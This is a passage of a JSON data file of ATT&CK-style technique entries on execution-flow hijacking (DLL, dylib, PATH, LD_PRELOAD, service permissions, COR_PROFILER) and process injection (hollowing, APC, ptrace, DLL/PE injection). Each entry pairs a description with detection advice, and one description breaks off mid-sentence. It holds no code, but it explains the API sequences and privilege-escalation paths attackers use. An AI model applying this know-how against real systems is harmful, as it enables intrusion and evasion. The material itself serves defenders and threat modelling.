        "description": " \nAdversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution. \nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.  ",
        "detection": "\nMonitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.Monitor for changes to environment variables, as well as the commands to implement these changes.Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information.   Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\n"
      },
      "T1574.001": {
        "name": "DLL Search Order Hijacking",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  \nHijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution. \nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  \nby placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.  \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL.  \n  \n  \n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.  ",
        "detection": "\nMonitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\n\n"
      },
      "T1574.002": {
        "name": "DLL Side-Loading",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program. \nPrograms may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests  \nare not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.  \n\nAdversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.  ",
        "detection": "\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\n"
      },
      "T1574.004": {
        "name": "Dylib Hijacking",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking ambiguous paths  used to load libraries. Adversaries may plant trojan dynamic libraries, in a directory that will be searched by the operating system before the legitimate library specified by the victim program, so that their malicious library will be loaded into the victim program instead.  MacOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. \nA common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself.  \n  \n\nIf the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.  ",
        "detection": "\nObjective-See's Dylib Hijacking Scanner can be used to detect potential cases of dylib hijacking. Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. \n\n"
      },
      "T1574.005": {
        "name": "Executable Installer File Permissions Weakness",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. \nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the  %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of  DLL Search Order Hijacking . \nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to  Bypass User Account Control . Several examples of this weakness in existing common installers have been reported to software vendors.  \n  \nIf the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.  ",
        "detection": "\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.\n\n"
      },
      "T1574.006": {
        "name": "LD_PRELOAD",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the dynamic linker used to load libraries. The dynamic linker is used to load shared library dependencies needed by an executing program. The dynamic linker will typically check provided absolute paths and common directories for these dependencies, but can be overridden by shared objects specified by LD_PRELOAD to be loaded before all others.  \n \n\nAdversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or  /etc/ld.so.preload file.  \n \nLibraries specified by LD_PRELOAD with be loaded and mapped into memory by  dlopen() and  mmap() respectively.  \n  \n  \n\nLD_PRELOAD hijacking may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. Execution via LD_PRELOAD hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitor for changes to environment variables and files associated with loading shared libraries such as LD_PRELOAD, as well as the commands to implement these changes.Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\n"
      },
      "T1574.007": {
        "name": "Path Interception by PATH Environment Variable",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line. \nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\\system32 (e.g.,  C:\\Windows\\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line. \nFor example, if  C:\\example path precedes ",
        "detection": "\nMonitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1574.008": {
        "name": "Path Interception by Search Order Hijacking",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program. \nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.  \n  \n  \nHowever, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory. \nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument  net user . An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then  cmd.exe /C net user will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT.  \n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .  ",
        "detection": "\nMonitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1574.009": {
        "name": "Path Interception by Unquoted Path",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch. \nService paths  \nand shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\\unsafe path with space\\program.exe vs.  \"C:\\safe path with space\\program.exe\" ).  \n(stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\\program files\\myapp.exe , an adversary may create a program at  C:\\program.exe that will be run instead of the intended program.  \n  \n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.  ",
        "detection": "\nMonitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1574.010": {
        "name": "Services File Permissions Weakness",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. \nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.  ",
        "detection": "\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. \n\n"
      },
      "T1574.011": {
        "name": "Services Registry Permissions Weakness",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.  Windows stores local service configuration information in the Registry under  HKLM\\SYSTEM\\CurrentControlSet\\Services . The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell , or  Reg . Access to Registry keys is controlled through Access Control Lists and permissions.  \n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). \nAdversaries may also alter Registry keys associated with service failure parameters (such as  FailureCommand ) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.  \n \n  ",
        "detection": "\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information.   Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\n"
      },
      "T1574.012": {
        "name": "COR_PROFILER",
        "description": " \nAdversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.  \n \n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a  Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.  \n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex:  Bypass User Account Control ) if the victim .NET process executes at a higher permission level, as well as to hook and  Impair Defenses provided by .NET processes.  \n \n \n \n \n ",
        "detection": "\nFor detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and Reg, monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.  Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.\n\n"
      },
      "T1055": {
        "name": "Process Injection",
        "description": " \nAdversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique.  Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.        Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.  Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.001": {
        "name": "Dynamic-link Library Injection",
        "description": " \nAdversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process. \nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as  VirtualAllocEx and  WriteProcessMemory , then invoked with  CreateRemoteThread (which calls the  LoadLibrary API responsible for loading the DLL).  \n \nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of  LoadLibrary ).  \n \n \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.002": {
        "name": "Portable Executable Injection",
        "description": " \nAdversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as  VirtualAllocEx and  WriteProcessMemory , then invoked with  CreateRemoteThread or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.  \n \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.003": {
        "name": "Thread Execution Hijacking",
        "description": " \nAdversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as  OpenThread . At this point the process can be suspended then written to, realigned to the injected code, and resumed via  SuspendThread ,  VirtualAllocEx ,  WriteProcessMemory ,  SetThreadContext , then  ResumeThread respectively.  \n\nThis is very similar to  Process Hollowing but targets an existing process rather than creating a process in a suspended state. \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.004": {
        "name": "Asynchronous Procedure Call",
        "description": " \nAdversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \nAPC injection is commonly performed by attaching malicious code to the APC Queue  \nof a process's thread. Queued APC functions are executed when the thread enters an alterable state.  \nA handle to an existing victim process is first created with native Windows API calls such as  OpenThread . At this point  QueueUserAPC can be used to invoke a function (such as  LoadLibrayA pointing to a malicious DLL). \nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  \nAtomBombing  \nis another variation that utilizes APCs to invoke malicious code previously written to the global atom table.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.005": {
        "name": "Thread Local Storage",
        "description": " \nAdversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other  Process Injection techniques such as  Process Hollowing .  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.008": {
        "name": "Ptrace System Calls",
        "description": " \nAdversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.  \nPtrace system call injection is commonly performed by writing arbitrary code into a running process (ex:  malloc ) then invoking that memory with  PTRACE_SETREGS to set the register containing the next instruction to execute. Ptrace system call injection can also be done with  PTRACE_POKETEXT /  PTRACE_POKEDATA , which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction).  \n \n \nPtrace system call injection may not be possible targeting processes with high-privileges, and on some system those that are non-child processes.  \n \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.009": {
        "name": "Proc Memory",
        "description": " \nAdversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \nProc memory injection involves enumerating the memory of a process via the /proc filesystem (  /proc/[pid] ) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within  /proc/[pid]/maps can be overwritten using dd.  \n \n \n \nOther techniques such as  LD_PRELOAD may be used to populate a target process with more available gadgets. Similar to  Process Hollowing , proc memory injection may target child processes (such as a backgrounded copy of sleep).  \n \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nFile system monitoring can determine if /proc files are being modified. Users should not have permission to modify these in most cases. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.011": {
        "name": "Extra Window Memory Injection",
        "description": " \nAdversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).  \nRegistration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.  \n  \n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM. \nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as  WriteProcessMemory and  CreateRemoteThread .  \nMore sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  \n  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitor for API calls related to enumerating and manipulating EWM such as GetWindowLong   and SetWindowLong  . Malware associated with this technique have also used SendNotifyMessage   to trigger the associated window procedure and eventual malicious injection.  \n\n"
      },
      "T1055.012": {
        "name": "Process Hollowing",
        "description": " \nAdversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process. \nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as  CreateProcess , which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as  ZwUnmapViewOfSection or  NtUnmapViewOfSection before being written to, realigned to the injected code, and resumed via  VirtualAllocEx ,  WriteProcessMemory ,  SetThreadContext , then  ResumeThread respectively.  \n \n\nThis is very similar to  Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.013": {
        "name": "Process Doppelgänging",
